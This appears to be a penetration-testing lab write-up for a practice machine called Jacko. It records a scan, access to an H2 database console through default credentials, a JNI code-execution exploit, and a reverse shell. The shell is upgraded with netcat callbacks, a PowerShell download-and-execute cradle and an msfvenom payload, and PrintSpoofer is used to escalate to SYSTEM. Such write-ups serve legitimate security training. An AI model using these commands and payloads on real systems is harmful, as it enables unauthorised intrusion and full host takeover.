# Jacko

https://book.hacktricks.xyz/pentesting/pentesting-web/h2-java-sql-database

# Enumeration

### nmap

```
# Nmap 7.92 scan initiated Wed Jan 19 07:20:32 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/autorecon/results/192.168.151.66/scans/_full_tcp_nmap.txt -oX /root/autorecon/results/192.168.151.66/scans/xml/_full_tcp_nmap.xml 192.168.151.66
adjust_timeouts2: packet supposedly had rtt of -335005 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -335005 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -334817 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -334817 microseconds.  Ignoring time.
Nmap scan report for 192.168.151.66
Host is up, received user-set (0.17s latency).
Scanned at 2022-01-19 07:20:49 +08 for 382s
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: H2 Database Engine (redirect)
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 127
7680/tcp open  tcpwrapped    syn-ack ttl 127
8082/tcp open  http          syn-ack ttl 127 H2 database http console
|_http-title: H2 Console
|_http-favicon: Unknown favicon MD5: D2FBC2E4FB758DC8672CDEFB4D924540
| http-methods: 
|_  Supported Methods: GET POST
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|98 (86%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_98
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows XP SP3 (86%), Microsoft Windows 98 SE (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=1/19%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=61E74CCF%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=101%TS=U)
SEQ(SP=102%GCD=1%ISR=101%TI=RD%TS=U)
OPS(O1=M54ENW8NNS%O2=M54ENW8NNS%O3=M54ENW8%O4=M54ENW8NNS%O5=M54ENW8NNS%O6=M54ENNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M54ENW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Randomized
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-01-18T23:26:33
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 29686/tcp): CLEAN (Timeout)
|   Check 2 (port 49583/tcp): CLEAN (Timeout)
|   Check 3 (port 16514/udp): CLEAN (Timeout)
|   Check 4 (port 29875/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   171.37 ms 192.168.49.1
2   171.24 ms 192.168.151.66

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 19 07:27:11 2022 -- 1 IP address (1 host up) scanned in 399.81 seconds
```

## 8082 - H2 Database

Can login with the following credentials
`jdbc:h2:~/test` , `sa`: No password

![](Pasted%20image%2020220120215407.png)

![](Pasted%20image%2020220120215835.png)

![](Pasted%20image%2020220120215925.png)

![](Pasted%20image%2020220120220432.png)

### Exploit 1 Test

```
┌──(kali㉿kali)-[~]
└─$ cd /tmp                                                                                                                            
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ wget https://gist.github.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed/raw/152ffcd996497e01cfee1ceb7237375f1a1e72f2/h2-exploit.py 
--2022-01-20 08:00:50--  https://gist.github.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed/raw/152ffcd996497e01cfee1ceb7237375f1a1e72f2/h2-exploit.py
Resolving gist.github.com (gist.github.com)... 20.205.243.166
Connecting to gist.github.com (gist.github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: https://gist.githubusercontent.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed/raw/152ffcd996497e01cfee1ceb7237375f1a1e72f2/h2-exploit.py [following]
--2022-01-20 08:00:50--  https://gist.githubusercontent.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed/raw/152ffcd996497e01cfee1ceb7237375f1a1e72f2/h2-exploit.py
Resolving gist.githubusercontent.com (gist.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to gist.githubusercontent.com (gist.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2904 (2.8K) [text/plain]
Saving to: ‘h2-exploit.py’

h2-exploit.py                             100%[=====================================================================================>]   2.84K  --.-KB/s    in 0.004s  

2022-01-20 08:00:51 (737 KB/s) - ‘h2-exploit.py’ saved [2904/2904]

                
┌──(kali㉿kali)-[/tmp]
└─$ python3 h2-exploit.py -H 192.168.234.66:8082                                                                                                                  130 ⨯
[*] Attempting to create database
[-] Unable to login
                         
┌──(kali㉿kali)-[/tmp]
└─$ python3 h2-exploit.py  -H 192.168.234.66:8082 -d jdbc:h2:~/emptydb-o9Wzo                                                                                        2 ⨯
[*] Attempting to create database
[-] Unable to login
                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 h2-exploit.py  -H 192.168.234.66:8082 -d jdbc:h2:~/test          
[*] Attempting to create database
[+] Created database and logged in
[*] Sending stage 1
[+] Shell succeeded - ^c or quit to exit
h2-shell$ whoami
[-] Invalid command (list index out of range)
h2-shell$ help
[-] Invalid command (list index out of range)
h2-shell$ 

```


### Exploit 2 test

1. Add empty password
2. Change database name

But doesn't work since SHELLEXEC is not a funciton

### Exploit 3 test

```
┌──(kali㉿kali)-[/tmp]
└─$ searchsploit h2 database                                                                                                                                    1 ⨯ 1 ⚙
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                        |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
H2 Database - 'Alias' Arbitrary Code Execution                                                                                        | java/local/44422.py
H2 Database 1.4.196 - Remote Code Execution                                                                                           | java/webapps/45506.py
H2 Database 1.4.197 - Information Disclosure                                                                                          | linux/webapps/45105.py
H2 Database 1.4.199 - JNI Code Execution                                                                                              | java/local/49384.txt
Oracle Database 10 g - XML DB xdb.xdb_pitrig_pkg Package PITRIG_TRUNCATE Function Overflow                                            | multiple/remote/31010.sql
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ searchsploit -m 49384                                                                                                                                           1 ⚙
  Exploit: H2 Database 1.4.199 - JNI Code Execution
      URL: https://www.exploit-db.com/exploits/49384
     Path: /usr/share/exploitdb/exploits/java/local/49384.txt
File Type: ASCII text, with very long lines

Copied to: /tmp/49384.txt

```

![](Pasted%20image%2020220120220916.png)

![](Pasted%20image%2020220120220943.png)

![](Pasted%20image%2020220120221020.png)

![](Pasted%20image%2020220120221052.png)

![](Pasted%20image%2020220120221109.png)
# Exploitation

Use exploit 3

![](Pasted%20image%2020220120222747.png)

![](Pasted%20image%2020220120223152.png)

![](Pasted%20image%2020220120223320.png)

![](Pasted%20image%2020220120223354.png)

![](Pasted%20image%2020220120223626.png)

![](Pasted%20image%2020220120224130.png)


## Reverse Shell

Payload from revshells.com

![](Pasted%20image%2020220120224244.png)

![](Pasted%20image%2020220120224215.png)

Get a weird shell

```
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 80               
[sudo] password for kali: 
listening on [any] 80 ...
connect to [192.168.49.234] from (UNKNOWN) [192.168.234.66] 49838

PS C:\Program Files (x86)\H2\service> whoami
PS C:\Program Files (x86)\H2\service> whoami
PS C:\Program Files (x86)\H2\service> cd \
PS C:\> cd \Users\tony\Desktop
PS C:\Users\tony\Desktop> type local.txt
635edfecabc5813785d2e63b31a5110e
PS C:\Users\tony\Desktop> ipconfig
PS C:\Users\tony\Desktop> dir


    Directory: C:\Users\tony\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        1/20/2022   6:22 AM             34 local.txt                                                             
-a----        4/22/2020   4:23 AM           1450 Microsoft Edge.lnk                                                    


PS C:\Users\tony\Desktop> 
```

## Upgrade Shell

```
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 80               
[sudo] password for kali: 
listening on [any] 80 ...
connect to [192.168.49.234] from (UNKNOWN) [192.168.234.66] 49838

PS C:\Program Files (x86)\H2\service> whoami
PS C:\Program Files (x86)\H2\service> whoami
PS C:\Program Files (x86)\H2\service> cd \
PS C:\> cd \Users\tony\Desktop
PS C:\Users\tony\Desktop> type local.txt
635edfecabc5813785d2e63b31a5110e
PS C:\Users\tony\Desktop> ipconfig
PS C:\Users\tony\Desktop> dir


    Directory: C:\Users\tony\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        1/20/2022   6:22 AM             34 local.txt                                                             
-a----        4/22/2020   4:23 AM           1450 Microsoft Edge.lnk                                                    


PS C:\Users\tony\Desktop> wget 192.168.49.234:8000/nc.exe -O nc.exe
PS C:\Users\tony\Desktop> wget 192.168.49.234:8000/nc.exe
PS C:\Users\tony\Desktop> wget 192.168.49.234/mc.exe     
PS C:\Users\tony\Desktop> wget 192.168.49.234/nc.exe -O nc.exe
PS C:\Users\tony\Desktop> ./nc.exe -e cmd 192.168.49.234 443 
PS C:\Users\tony\Desktop> ./nc.exe -e cmd 192.168.49.234 80



```

```
┌──(kali㉿kali)-[/tmp]
└─$ cp /home/kali/Documents/Notes/WindowsClient/practical_tools/nc.exe /tmp                                                                                         1 ⚙
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ file nc.exe                                                                                                                                                     1 ⚙
nc.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 -m http.server 8000                                                                                                                                     1 ⚙
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
^C
Keyboard interrupt received, exiting.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 -m http.server 80                                                                                                                                  1 ⚙
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.234.66 - - [20/Jan/2022 09:46:00] code 404, message File not found
192.168.234.66 - - [20/Jan/2022 09:46:00] "GET /mc.exe HTTP/1.1" 404 -
192.168.234.66 - - [20/Jan/2022 09:46:11] "GET /nc.exe HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ sudo nc -nlvp 80                                                                                                                                                1 ⚙
listening on [any] 80 ...
connect to [192.168.49.234] from (UNKNOWN) [192.168.234.66] 49866
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\tony\Desktop>

```
# Privesc

In one of the screenshots above, SeImpersonationPriv is enabled, so potato exploit

IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.234/Invoke-LovelyPotato.ps1')

## lovelypotato test

```
C:\Users\tony\Desktop>C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe
C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\tony\Desktop> whoami
whoami
whoami : The term 'whoami' is not recognized as the name of a cmdlet, function, script file, or operable program. 
Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ whoami
+ ~~~~~~
    + CategoryInfo          : ObjectNotFound: (whoami:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 
PS C:\Users\tony\Desktop> IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.234/Invoke-LovelyPotato.ps1') 
IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.234/Invoke-LovelyPotato.ps1') 

Name           Used (GB)     Free (GB) Provider      Root                                               CurrentLocation
----           ---------     --------- --------      ----                                               ---------------
HKCR                                   Registry      HKEY_CLASSES_ROOT                                                 
findstr : The term 'findstr' is not recognized as the name of a cmdlet, function, script file, or operable program. 
Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:39 char:46
+     $SystemCLSID = type $LocalPath\result.log | findstr /i "system" | ...
+                                                 ~~~~~~~
    + CategoryInfo          : ObjectNotFound: (findstr:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 
cmd : The term 'cmd' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the 
spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:42 char:33
+     $SystemCLSID | ForEach-Object {cmd /c "$LocalPath\juicypotato.exe ...
+                                    ~~~
    + CategoryInfo          : ObjectNotFound: (cmd:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 


PS C:\Users\tony\Desktop> 
PS C:\Users\tony\Desktop> C:\\Windows\\System32\\cmd.exe
C:\\Windows\\System32\\cmd.exe
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\tony\Desktop>exit
exit
PS C:\Users\tony\Desktop> 
PS C:\Users\tony\Desktop> dir C:\\Windows\\System32\\findstr.exe
dir C:\\Windows\\System32\\findstr.exe


    Directory: C:\Windows\System32


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        3/18/2019   9:45 PM          29696 findstr.exe                                                           


PS C:\Users\tony\Desktop> 
```


## Path Issue

Set-Item -Path Env:Path -Value ($Env:Path + ";C:\Windows\System32")

```
PS C:\Users\tony\Desktop> Get-ChildItem Env:PATH
Get-ChildItem Env:PATH

Name                           Value                                                                                   
----                           -----                                                                                   
Path                           C:\Users\tony\AppData\Local\Microsoft\WindowsApps;                                      


PS C:\Users\tony\Desktop> Set-Item -Path Env:Path -Value ($Env:Path + ";C:\Windows\System32")
Set-Item -Path Env:Path -Value ($Env:Path + ";C:\Windows\System32")
PS C:\Users\tony\Desktop> cmd
cmd
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\tony\Desktop>exit
exit
PS C:\Users\tony\Desktop> 

```


## Lovely Potato Exploit

```
┌──(kali㉿kali)-[/tmp]
└─$ git clone https://github.com/TsukiCTF/Lovely-Potato.git 
cd Lovely-Potato
sed -i 's/10.10.10.10/'$IP':80/g' Invoke-LovelyPotato.ps1 

Cloning into 'Lovely-Potato'...
^C
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ IP=192.168.49.234                                                                                                                                             130 ⨯
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ git clone https://github.com/TsukiCTF/Lovely-Potato.git 
cd Lovely-Potato
sed -i 's/10.10.10.10/'$IP':80/g' Invoke-LovelyPotato.ps1

Cloning into 'Lovely-Potato'...
remote: Enumerating objects: 34, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 34 (delta 2), reused 0 (delta 0), pack-reused 28
Receiving objects: 100% (34/34), 178.04 KiB | 239.00 KiB/s, done.
Resolving deltas: 100% (12/12), done.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/Lovely-Potato]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.234 LPORT=80  EXITFUNC=thread -f exe > meterpreter.exe                    
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/Lovely-Potato]
└─$ 
```

## PrintSpoofer.exe

```
PS C:\Users\tony\Desktop> wget 192.168.49.234/PrintSpoofer.exe -O PrintSpoofer.exe
wget 192.168.49.234/PrintSpoofer.exe -O PrintSpoofer.exe
PS C:\Users\tony\Desktop> wget 192.168.49.234/meterpreter.exe -O r.exe
wget 192.168.49.234/meterpreter.exe -O r.exe
wget : Error response
Error code: 404
Message: File not found.
Error code explanation: HTTPStatus.NOT_FOUND - Nothing matches the given URI.
At line:1 char:1
+ wget 192.168.49.234/meterpreter.exe -O r.exe
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebExc 
   eption
    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
PS C:\Users\tony\Desktop> wget 192.168.49.234/meterpreter.exe -O r.exe
wget 192.168.49.234/meterpreter.exe -O r.exe
PS C:\Users\tony\Desktop> ./r.exe
./r.exe
PS C:\Users\tony\Desktop> ./PrintSpoofer.exe -c "./r.exe" -i
./PrintSpoofer.exe -c "./r.exe" -i
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK

```

```
┌──(kali㉿kali)-[/tmp]
└─$ wget https://github.com/dievus/printspoofer/blob/master/PrintSpoofer.exe?raw=true                                                                               1 ⨯
--2022-01-20 10:45:49--  https://github.com/dievus/printspoofer/blob/master/PrintSpoofer.exe?raw=true
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe [following]
--2022-01-20 10:45:49--  https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe
Reusing existing connection to github.com:443.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/dievus/printspoofer/master/PrintSpoofer.exe [following]
--2022-01-20 10:45:50--  https://raw.githubusercontent.com/dievus/printspoofer/master/PrintSpoofer.exe
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 27136 (26K) [application/octet-stream]
Saving to: ‘PrintSpoofer.exe?raw=true’

PrintSpoofer.exe?raw=true                 100%[=====================================================================================>]  26.50K  --.-KB/s    in 0.02s   

2022-01-20 10:45:50 (1.09 MB/s) - ‘PrintSpoofer.exe?raw=true’ saved [27136/27136]

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ mv PrintSpoofer.exe\?raw=true PrintSpoofer.exe           
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ file PrintSpoofer.exe 
PrintSpoofer.exe: PE32+ executable (console) x86-64, for MS Windows
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 -m http.server 80                                                  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.234.66 - - [20/Jan/2022 10:46:21] "GET /PrintSpoofer.exe HTTP/1.1" 200 -
192.168.234.66 - - [20/Jan/2022 10:47:00] code 404, message File not found
192.168.234.66 - - [20/Jan/2022 10:47:00] "GET /meterpreter.exe HTTP/1.1" 404 -
^C
Keyboard interrupt received, exiting.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.234 LPORT=80  EXITFUNC=thread -f exe > meterpreter.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 -m http.server 80                                                                               
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.234.66 - - [20/Jan/2022 10:47:40] "GET /meterpreter.exe HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ sudo nc -nlvp 80              
listening on [any] 80 ...
connect to [192.168.49.234] from (UNKNOWN) [192.168.234.66] 51404
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\tony\Desktop>whoami
whoami
jacko\tony

C:\Users\tony\Desktop>^C
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ sudo nc -nlvp 80                                                                                                                                                1 ⨯
listening on [any] 80 ...
connect to [192.168.49.234] from (UNKNOWN) [192.168.234.66] 51408
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd \Users\administrator\Desktop
cd \Users\administrator\Desktop

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
8c5d5f938a3c379bb18fcb9a53e2d5ed

C:\Users\Administrator\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.234.66
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.234.254

C:\Users\Administrator\Desktop>

```

https://tryhackme.com/room/windows10privesc

![](Pasted%20image%2020220120234941.png)

# Others